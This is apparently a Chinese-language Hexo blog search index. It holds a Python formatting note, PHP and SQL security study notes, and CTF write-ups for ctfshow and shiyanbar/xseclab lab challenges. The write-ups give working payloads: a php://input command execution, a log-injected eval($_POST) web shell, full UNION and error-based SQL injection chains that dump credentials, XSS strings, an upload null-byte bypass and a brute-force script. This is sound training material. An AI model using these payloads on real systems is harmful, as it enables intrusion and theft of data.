<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python函数</title>
      <link href="2021/03/24/python%E5%87%BD%E6%95%B0/"/>
      <url>2021/03/24/python%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-format-格式化函数"><a href="#Python-format-格式化函数" class="headerlink" title="Python format 格式化函数"></a>Python format 格式化函数</h1><p>Python2.6 开始，新增了一种格式化字符串的函数 **str.format()**，它增强了字符串格式化的功能。</p><p>基本语法是通过 <strong>{}</strong> 和 <strong>:</strong> 来代替以前的 <strong>%</strong></p><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)    <span class="comment"># 不设置指定位置，按默认顺序</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)  <span class="comment"># 设置指定位置</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)  <span class="comment"># 设置指定位置</span></span><br><span class="line"><span class="string">&#x27;world hello world&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 自己看的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>study</title>
      <link href="2021/03/23/study/"/>
      <url>2021/03/23/study/</url>
      
        <content type="html"><![CDATA[<h1 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h1><h2 id="普通的MD5绕过"><a href="#普通的MD5绕过" class="headerlink" title="普通的MD5绕过"></a>普通的MD5绕过</h2><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以<strong>”0E”</strong>开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>“===”和”!==”即strict比较符，只有在类型相同时才相等。”==“和”!=”即non-strict比较符，会在类型转换后进行比较。<br>此外0 == 字符会被认为是正确的，可以绕过验证<br>常见的md5碰撞字符串网上可以查找到</p><h2 id="绕过-a-b"><a href="#绕过-a-b" class="headerlink" title="绕过 a===b"></a>绕过 a===b</h2><p>md5函数处理数组时直接返回null，所以两个参数都为数组类型，就可实现<code>a!==b&amp;&amp;md5(a)===md5(b)</code></p><h1 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h1><p>在 tornado 模板中，存在一些可以访问的快速对象，例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;&#123; escape(handler.settings[&quot;cookie&quot;]) &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象就是<code>handler.settings</code>对象</p><p><code>handler</code>指向<code>RequestHandler</code></p><p>而<code>RequestHandler.settings</code>有指向<code>self.application.settings</code></p><p>所有<code>handler.settings</code>就指向<code>RequestHandler.application.settings</code>了</p><h1 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue()报错注入"></a>extractvalue()报错注入</h1><p>extractvalue()<br>extractvalue() :对XML文档进行查询的函数</p><p>其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样</p><p>语法：extractvalue(目标xml文档，xml路径)</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><p>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p><p><code>select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))</code></p><p>使用concat()拼接 ‘ / ‘ 效果相同，</p><p><code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘/’,(select database()))))</code></p><p>这里在’anything’中查询不到 位置是 /database()的内容，</p><p>但也没有语法错误，不会报错，下面故意写入语法错误：</p><p><code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</code></p><p>可以看出，以~开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。</p><p>有一点需要注意，<strong>extractvalue()能查询字符串的最大长度为32</strong>，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位。</p><h1 id="MySQL语句"><a href="#MySQL语句" class="headerlink" title="MySQL语句"></a>MySQL语句</h1><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>]]></content>
      
      
      <categories>
          
          <category> 自己看的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> MySQL </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web</title>
      <link href="2021/03/21/ctfshow%20web/"/>
      <url>2021/03/21/ctfshow%20web/</url>
      
        <content type="html"><![CDATA[<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>先使用bp截包，之后使用php伪协议构造payload</p><p>payload： <code>?url=php://input</code> ，再使用<code>system(&#39;ls&#39;)</code> 查看有哪些文件。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/21/NLvXHokTYWaCc7j.png" alt="image-20210321125420298"></p><p>发现<code>ctf_go_go_go</code>这个文件，使用<code>system(&#39;cat ctf_go_go_go&#39;)</code> 打开这个文件得到flag</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/21/LBltcaTDpRVnsWZ.png" alt="image-20210321125840281"></p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>在尝试上题的方式后回显为 error</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/21/YEqItskwGX1v2rT.png" alt="image-20210321123504753"></p><p>查看hint后，知道这题使用日志注入解决</p><p>这里我们输入默认目录获取日志 <strong>?url=/var/log/nginx/access.log</strong> 得到日志文件</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/21/UKZWR1b2uep6ViD.png" alt="image-20210321124218560"></p><p>接下来就要进行日志注入，这里在参数中输入一句话木马</p><p> <code>&lt;?php eval(&#39;$_POST[&#39;shell&#39;]) ?&gt;</code>防止在重新发包是被URL编码</p><p>发送后使用我们的老朋友 中国蚁剑 连入后在www目录下找到 <code>flag.txt</code> 的文件得到flag</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自己看的(2)</title>
      <link href="2021/03/17/%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84-2/"/>
      <url>2021/03/17/%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84-2/</url>
      
        <content type="html"><![CDATA[<h1 id="直接查看源代码"><a href="#直接查看源代码" class="headerlink" title="直接查看源代码"></a>直接查看源代码</h1><p><a href="http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php"><strong>如题</strong></a></p><h1 id="修改或添加HTTP请求头"><a href="#修改或添加HTTP请求头" class="headerlink" title="修改或添加HTTP请求头"></a>修改或添加HTTP请求头</h1><p>常见的有：</p><p>Referer来源伪造</p><p>X-Forwarded-For：ip伪造</p><p><a href="http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php">User-Agent：用户代理（就是用什么浏览器什么的）</a></p><p>//.net的版本修改，后面添加，如版本9</p><p>.NET CLR 9</p><p> <a href="http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php">Accept-Language：语言1</a></p><p><a href="http://ctf1.shiyanbar.com/basic/header/">Accept-Language：语言2</a></p><p><a href="http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php">Cookie的修改</a></p><h1 id="查看HTTP请求头或响应头"><a href="#查看HTTP请求头或响应头" class="headerlink" title="查看HTTP请求头或响应头"></a>查看HTTP请求头或响应头</h1><p><a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php">题1</a></p><p><a href="http://ctf1.shiyanbar.com/basic/catch/">题2</a></p><h1 id="302跳转的中转网页有信息"><a href="#302跳转的中转网页有信息" class="headerlink" title="302跳转的中转网页有信息"></a>302跳转的中转网页有信息</h1><p><a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php">题1</a></p><h1 id="javascript代码绕过"><a href="#javascript代码绕过" class="headerlink" title="javascript代码绕过"></a>javascript代码绕过</h1><p>通过删除或修改代码或者本地代理改包绕过</p><p><a href="http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php">http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php</a></p><h1 id="使用burp的repeater查看整个HTTP包"><a href="#使用burp的repeater查看整个HTTP包" class="headerlink" title="使用burp的repeater查看整个HTTP包"></a>使用burp的repeater查看整个HTTP包</h1><p><a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php">http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php</a></p><h1 id="阅读javascript代码，直接控制台获取正确密码"><a href="#阅读javascript代码，直接控制台获取正确密码" class="headerlink" title="阅读javascript代码，直接控制台获取正确密码"></a>阅读javascript代码，直接控制台获取正确密码</h1><p><a href="http://ctf1.shiyanbar.com/basic/js/index.asp">http://ctf1.shiyanbar.com/basic/js/index.asp</a></p><h1 id="robots-txt文件获取信息"><a href="#robots-txt文件获取信息" class="headerlink" title="robots.txt文件获取信息"></a>robots.txt文件获取信息</h1><p>这本来是给搜索引擎看的信息，很可能暴露网站结构目录</p><p><a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php">http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php</a></p><h1 id="前端脚本类"><a href="#前端脚本类" class="headerlink" title="前端脚本类"></a>前端脚本类</h1><h2 id="js加解密"><a href="#js加解密" class="headerlink" title="js加解密"></a>js加解密</h2><p><a href="http://ctf5.shiyanbar.com/DUTCTF/1.html">http://ctf5.shiyanbar.com/DUTCTF/1.html</a> //直接在F12控制台粘贴就有了</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><a href="http://lab1.xseclab.com/realxss1_f123c17dd9c363334670101779193998/index.php">http://lab1.xseclab.com/realxss1_f123c17dd9c363334670101779193998/index.php</a></p><p>这题题目就有漏洞，直接在命令行输入下面的就有了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$.post(<span class="string">&quot;./getkey.php?ok=1&quot;</span>,&#123;<span class="string">&#x27;url&#x27;</span>:location.href,<span class="string">&#x27;ok&#x27;</span>:ok&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">console.log(data);</span><br><span class="line">        &#125;);</span><br><span class="line">showkey();</span><br></pre></td></tr></table></figure><p>当然简单的直接输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(HackingLab)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这样也可以</p><p>这题也差不多<br><a href="http://lab1.xseclab.com/realxss2_bcedaba7e8618cdfb51178765060fc7d/index.php">http://lab1.xseclab.com/realxss2_bcedaba7e8618cdfb51178765060fc7d/index.php</a></p><p>可以直接输入上题的那个jquery，也可以乖乖下面的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;11&quot;</span> onerror=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure><p><a href="http://lab1.xseclab.com/realxss3_9b28b0ff93d0b0099f5ac7f8bad3f368/index.php">http://lab1.xseclab.com/realxss3_9b28b0ff93d0b0099f5ac7f8bad3f368/index.php</a></p><h1 id="后端脚本类"><a href="#后端脚本类" class="headerlink" title="后端脚本类"></a>后端脚本类</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="asp代码审计："><a href="#asp代码审计：" class="headerlink" title="asp代码审计："></a>asp代码审计：</h3><p>1.<a href="http://ctf8.shiyanbar.com/aspaudit/">http://ctf8.shiyanbar.com/aspaudit/</a> </p><p>长度限制:F12删maxlength，或者改长度，本地代理都可以绕过</p><p>//Username： ‘union  select 1,1,1 from bdmin ‘  ，为什么是三列呢，一般表中都会设置id，加上账号密码就3个了，不行就猜4列咯…，因为union的之前的用户名为空，所以前面的结果集为空，所以最后的结果集只有我们后面的1,1,1了，所以在密码那输入1就是密码。</p><p>这样也行，反正就闭合标签  ‘union  select 1,1,1 from bdmin where ‘1’=’1</p><h3 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h3><p>1.<a href="http://ctf8.shiyanbar.com/phpaudit/">http://ctf8.shiyanbar.com/phpaudit/</a> //其实这个就是修改http请求头的X-Forwarded-For</p><p>2.<a href="http://ctf1.shiyanbar.com/web/4/index.php">http://ctf1.shiyanbar.com/web/4/index.php</a> //跟下面的后台登陆型第一个一样，请看下面的后台登陆型第一个</p><p>3.<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php">http://ctf5.shiyanbar.com/DUTCTF/index.php</a> //二次urlencode</p><p>4.<a href="http://ctf1.shiyanbar.com/web/5/index.php">http://ctf1.shiyanbar.com/web/5/index.php</a> //请看后台登陆型第二个</p><p>5.<a href="http://ctf4.shiyanbar.com/web/false.php">http://ctf4.shiyanbar.com/web/false.php</a> //数组的哈希值，都是null</p><p>6.<a href="http://ctf4.shiyanbar.com/web/Session.php">http://ctf4.shiyanbar.com/web/Session.php</a> //只需要在<strong>第一次提交</strong>的时候直接提交password=即可，因为第一次访问时服务器那边也没设置对应的$_SESSION[‘password’]，由于是==比较，两者是相等的。</p><p><strong>表单隐藏</strong> <a href="http://ctf10.shiyanbar.com:8888/main.php">http://ctf10.shiyanbar.com:8888/main.php</a></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><strong>简单的直接上工具就ko了</strong>，如sqlmap，等-——<a href="http://blog.jobbole.com/17763/">10大sql注入</a>工具</p><p>如下面几个：</p><p>1.<a href="http://ctf5.shiyanbar.com:8080/9/asp.asp">http://ctf5.shiyanbar.com:8080/9/asp.asp</a></p><p>2.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1">http://ctf5.shiyanbar.com/8/index.php?id=1</a></p><p>当然不用and XX也是可以的，下面只是举个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;手工注入过程</span><br><span class="line">&#x2F;&#x2F;判断注入类型为and布尔型注入</span><br><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1%20and%201&#x3D;1</span><br><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1%20and%201&#x3D;2</span><br><span class="line">&#x2F;&#x2F;判断字段数</span><br><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1%20order%20by%203</span><br><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1%20order%20by%202</span><br><span class="line">&#x2F;&#x2F;获取数据库基本信息(&#x2F;&#x2F;concat_ws是字符串连接函数，其中第一个参数是分隔符，CHAR(58)是冒号，因为冒号的ASCII是58)</span><br><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1%20and%201&#x3D;2%20union%20select%201,concat_ws(CHAR(58),user(),database(),version()) </span><br><span class="line">&#x2F;&#x2F;获取数据库中的表,其中table_schema可以理解为数据库吧(他是mysql系统表里面的一个字段，这里我们用16进制表示，就是上一句查询到的数据库)</span><br><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1%20and%201&#x3D;2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;0x6d795f6462</span><br><span class="line">&#x2F;&#x2F;获取重要表的字段</span><br><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_name&#x3D;0x746869736b6579</span><br><span class="line">&#x2F;&#x2F;获取表中的内容</span><br><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,k0y from thiskey</span><br></pre></td></tr></table></figure><p>3.<a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php">http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php</a></p><p>密码随便输入</p><p>4.<a href="http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php</a></p><p>payload：</p><p><a href="http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1</a> or 1=1</p><p>5.<a href="http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1</a></p><p>宽字节注入，在其他没头绪的时候必须考虑这个了，哎，而且题目都说过滤了</p><p>还有响应头：Content-Type：text/html; charset=gb2312<br>payload<br><a href="http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%EF%BF%BD%27">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%a0%27</a> or 1=1 limit 2,1%23</p><p>6.<a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</a></p><p>利用报错注入</p><p><a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1</a> procedure analyse(extractvalue(1,concat(0x3a,database())),1)   </p><p>数据库：mydbs</p><p><a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1</a> procedure analyse(extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema=0x6d79646273 limit 0,1 ))),1)</p><p>爆表</p><p><a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1</a> procedure analyse(extractvalue(1,concat(0x3a,(select concat(username,0x3a,password) from user limit 2,1 ))),1)</p><p>爆数据</p><h2 id="写点脚本的"><a href="#写点脚本的" class="headerlink" title="写点脚本的"></a>写点脚本的</h2><p>注意看响应头，You must do it as fast as you can!，这个手速是不行的，必须编程获取后解码，跟着post数据：key=XXXXXXXXXXXXX</p><p><a href="http://ctf4.shiyanbar.com/web/10.php">http://ctf4.shiyanbar.com/web/10.php</a></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://ctf4.shiyanbar.com/web/10.php&#x27;</span> </span><br><span class="line">req=requests.get(url)</span><br><span class="line"><span class="built_in">print</span> req.text</span><br><span class="line">key=req.headers[<span class="string">&#x27;FLAG&#x27;</span>]</span><br><span class="line">key=base64.b64decode(key)</span><br><span class="line">key=key.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">data=&#123;<span class="string">&#x27;key&#x27;</span>:key&#125;</span><br><span class="line">r=requests.post(url,data=data) </span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="后台登陆型"><a href="#后台登陆型" class="headerlink" title="后台登陆型"></a>后台登陆型</h2><p>给了源代码，主要看sql语句，注释掉后面的and (pw=’$pass’)，当注意闭合小括号 payload  ：user=admin’)#&amp;pass=432142</p><p>1.<a href="http://ctf1.shiyanbar.com/web/4/index.php">http://ctf1.shiyanbar.com/web/4/index.php</a></p><p>2.<a href="http://ctf1.shiyanbar.com/web/5/index.php">http://ctf1.shiyanbar.com/web/5/index.php</a></p><p>//这题可以看看asp代码审计第一题，你或许有思路，后面有答案鼠标刮过即可（鼠标选中冒号后面的空白）：user=’ union select ‘c4ca4238a0b923820dcc509a6f75849b’  from php – &amp;pass=1</p><p>那个MD5是密码1的md5</p><h2 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h2><p><a href="http://www.shiyanbar.com/ctf/1760">http://www.shiyanbar.com/ctf/1760</a></p><p>解密代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cipher</span> = <span class="string">&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;</span>;</span><br><span class="line"><span class="variable">$tmp</span> = base64_decode(strrev(str_rot13(<span class="variable">$cipher</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$tmp</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="variable">$a</span> = substr(<span class="variable">$tmp</span>, <span class="variable">$i</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$b</span>.chr(ord(<span class="variable">$a</span>)<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> strrev(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><h2 id="上传绕过类"><a href="#上传绕过类" class="headerlink" title="上传绕过类"></a>上传绕过类</h2><p><a href="http://ctf4.shiyanbar.com/web/upload">http://ctf4.shiyanbar.com/web/upload</a> //这个注意看抓包的数据，既有路径，又有文件名，文件名不行，就试试路径的00截断  /uploads/sdf.php+十六进制的00</p><p>multipart/form-data大写绕过</p><h2 id="php的特性"><a href="#php的特性" class="headerlink" title="php的特性"></a>php的特性</h2><p>1.数字与字符串比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump( <span class="number">0</span> == <span class="string">&quot;a&quot;</span> ); </span><br><span class="line">var_dump( <span class="string">&quot;0&quot;</span> == <span class="string">&quot;a&quot;</span> );</span><br></pre></td></tr></table></figure><p>第一个返回的是 true ，第二个返回的是 false</p><p>因为php把字母开头的转化为整型时，转化为0， 前面数字后面字母的话就只取到第一个字母出现的位置之前（如intval(‘’123abd45gf)结果为123）</p><p>2.md5“碰撞”</p><p>因为php 0e开头的字符串都是==的，不是===哦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">&quot;0e462097431906854&quot;</span>==<span class="string">&quot;0e83040041&quot;</span>);</span><br></pre></td></tr></table></figure><p>上面这个返回true，如果题目的md5是0e开头的，你懂的</p><p>下面给一组数据吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(&#39;240610708&#39;) 的结果是：0e462097431906509019562988736854 </span><br><span class="line">md5(&#39;QNKCDZO&#39;) 的结果是：0e830400451993494058024219903391</span><br></pre></td></tr></table></figure><p>240610708、QNKCDZO、aabg7XSs、aabC9RqS</p><p>3.md5数组</p><p>md5(array) == NULL</p><p>4.strcmp(array,string) ==</p><p>5.变量覆盖：register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会被直接的注册为全局变量直接使用，而Off的时候，我们需要到特定的数组里去得到它。PHP4默认开启，PHP5以后默认关闭。<br>还有就是extract那个函数，也可以存在变量覆盖<a href="http://www.w3school.com.cn/php/func_array_extract.asp">http://www.w3school.com.cn/php/func_array_extract.asp</a></p><p>6.ereg函数漏洞：00截断<br>%00</p><p><a href="http://www.shiyanbar.com/ctf/1805">http://www.shiyanbar.com/ctf/1805</a></p><h2 id="备份文件类型的"><a href="#备份文件类型的" class="headerlink" title="备份文件类型的"></a>备份文件类型的</h2><p>.bak  ultroedit….</p><p>~</p><p>.xxxx.php.swp  .xxxx.php.swo  vim</p><h2 id="验证码类的"><a href="#验证码类的" class="headerlink" title="验证码类的"></a>验证码类的</h2><p><a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php">http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php</a></p><p>这个验证码的特点是，<strong>在一次会话中</strong>，下一次提交，上一次的验证码不会失效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line">header = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=9b8f8686269f5d70a44766e3c5f4dcdc&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> pwd in xrange(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line"> </span><br><span class="line">data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:pwd,<span class="string">&#x27;vcode&#x27;</span>:<span class="string">&#x27;c3pe&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">ret = req.post(url, data=data, headers=header)</span><br><span class="line"><span class="keyword">print</span> ret.text</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> not in ret.text:</span><br><span class="line"><span class="keyword">print</span> pwd</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/17/WwMCvA8dkh1TQEn.png" alt="img"></p><p><a 